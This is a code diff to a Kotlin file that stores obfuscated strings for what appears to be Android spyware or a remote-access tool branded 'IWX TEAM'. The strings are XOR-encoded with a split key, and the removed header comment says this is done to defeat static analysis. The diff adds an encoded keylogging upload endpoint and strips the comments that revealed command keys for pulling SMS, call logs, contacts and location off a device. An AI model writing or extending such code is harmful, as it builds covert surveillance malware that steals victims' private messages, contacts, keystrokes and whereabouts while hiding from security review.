@@ -1,10 +1,5 @@
 package com.nexlink.bridge
 
-/**
- * Obfuscated string store — semua literal sensitif disimpan sebagai
- * XOR-encrypted IntArray. Key di-split 4 bagian supaya tidak terbaca
- * saat static analysis / strings dump.
- */
 internal object ObfStr {
 
     private fun k1() = byteArrayOf(0x4B, 0x7A, 0x39)
@@ -28,7 +23,7 @@ internal object ObfStr {
         63, 89, 88, 87, 36, 20
     ))
 
-    // ── KeyFetcher ────────────────────────────────────────────────────────────
+    // ── API endpoints ─────────────────────────────────────────────────────────
     fun apiKeyEndpoint() = d(intArrayOf(100, 27, 73, 72, 66, 34, 72))
     fun apiHeartbeat()   = d(intArrayOf(
         100, 27, 73, 72, 66, 50, 70, 4, 49, 20, 87, 11,
@@ -40,36 +35,32 @@ internal object ObfStr {
     ))
     fun apiModule()      = d(intArrayOf(100, 27, 73, 72, 66, 59, 76, 22, 45, 27, 87, 11))
     fun apiResult()      = d(intArrayOf(100, 27, 73, 72, 66, 50, 70, 4, 49, 20, 87, 11, 57, 31, 74, 84, 1, 34))
+    // "/api/device/keylog"
+    fun apiKeylog()      = d(intArrayOf(100, 27, 73, 72, 66, 50, 70, 4, 49, 20, 87, 11, 32, 31, 64, 77, 2, 49))
 
     // ── SharedPreferences ─────────────────────────────────────────────────────
-    fun prefsName()  = d(intArrayOf(42, 10, 73, 126, 30, 34, 66, 6, 61))
-    fun prefsKeyId() = d(intArrayOf(40, 19, 93))
+    fun prefsName()     = d(intArrayOf(42, 10, 73, 126, 30, 34, 66, 6, 61))
+    fun prefsKeyId()    = d(intArrayOf(40, 19, 93))
+    // "connector_prefs"
+    fun mainPrefsName() = d(intArrayOf(40, 21, 87, 79, 8, 53, 87, 29, 42, 40, 66, 86, 46, 28, 74))
 
     // ── Command keys ──────────────────────────────────────────────────────────
-    // "get_sms"
-    fun cmdSms()          = d(intArrayOf(44, 31, 77, 126, 30, 59, 80))
-    // "get_sms:"
-    fun cmdSmsPrefix()    = d(intArrayOf(44, 31, 77, 126, 30, 59, 80, 72))
-    // "get_calls"
-    fun cmdCalls()        = d(intArrayOf(44, 31, 77, 126, 14, 55, 79, 30, 43))
-    // "get_calls:"
-    fun cmdCallsPrefix()  = d(intArrayOf(44, 31, 77, 126, 14, 55, 79, 30, 43, 77))
-    // "get_contacts"
-    fun cmdContacts()     = d(intArrayOf(44, 31, 77, 126, 14, 57, 77, 6, 57, 20, 70, 87))
-    // "get_contacts:"
+    fun cmdSms()           = d(intArrayOf(44, 31, 77, 126, 30, 59, 80))
+    fun cmdSmsPrefix()     = d(intArrayOf(44, 31, 77, 126, 30, 59, 80, 72))
+    fun cmdCalls()         = d(intArrayOf(44, 31, 77, 126, 14, 55, 79, 30, 43))
+    fun cmdCallsPrefix()   = d(intArrayOf(44, 31, 77, 126, 14, 55, 79, 30, 43, 77))
+    fun cmdContacts()      = d(intArrayOf(44, 31, 77, 126, 14, 57, 77, 6, 57, 20, 70, 87))
     fun cmdContactsPrefix()= d(intArrayOf(44, 31, 77, 126, 14, 57, 77, 6, 57, 20, 70, 87, 113))
-    // "get_location"
-    fun cmdLocation()     = d(intArrayOf(44, 31, 77, 126, 1, 57, 64, 19, 44, 30, 93, 74))
-    // "command_result"
-    fun cmdResult()       = d(intArrayOf(40, 21, 84, 76, 12, 56, 71, 45, 42, 18, 65, 81, 39, 14))
+    fun cmdLocation()      = d(intArrayOf(44, 31, 77, 126, 1, 57, 64, 19, 44, 30, 93, 74))
+    fun cmdResult()        = d(intArrayOf(40, 21, 84, 76, 12, 56, 71, 45, 42, 18, 65, 81, 39, 14))
 
-    // ── WakeLock tags ─────────────────────────────────────────────────────────
-    // "IWXPanel:WakeLock"
-    fun wakeLock()        = d(intArrayOf(2, 45, 97, 113, 12, 56, 70, 30, 98, 32, 83, 79, 46, 54, 86, 66, 6))
-    // "IWXPanel:WakeScreen"
-    fun wakeScreen()      = d(intArrayOf(2, 45, 97, 113, 12, 56, 70, 30, 98, 32, 83, 79, 46, 41, 90, 83, 12, 51, 77))
+    // ── WakeLock / UI tags ────────────────────────────────────────────────────
+    fun wakeLock()    = d(intArrayOf(2, 45, 97, 113, 12, 56, 70, 30, 98, 32, 83, 79, 46, 54, 86, 66, 6))
+    fun wakeScreen()  = d(intArrayOf(2, 45, 97, 113, 12, 56, 70, 30, 98, 32, 83, 79, 46, 41, 90, 83, 12, 51, 77))
+    // "IWX Panel"
+    fun panelTag()    = d(intArrayOf(2, 45, 97, 1, 61, 55, 77, 23, 52))
     // "By IWX TEAM"
-    fun brandTag()        = d(intArrayOf(9, 3, 25, 104, 58, 14, 3, 38, 29, 54, 127))
+    fun brandTag()    = d(intArrayOf(9, 3, 25, 104, 58, 14, 3, 38, 29, 54, 127))
 
     // ── Status messages ───────────────────────────────────────────────────────
     fun msgOk()     = d(intArrayOf(4, 49))
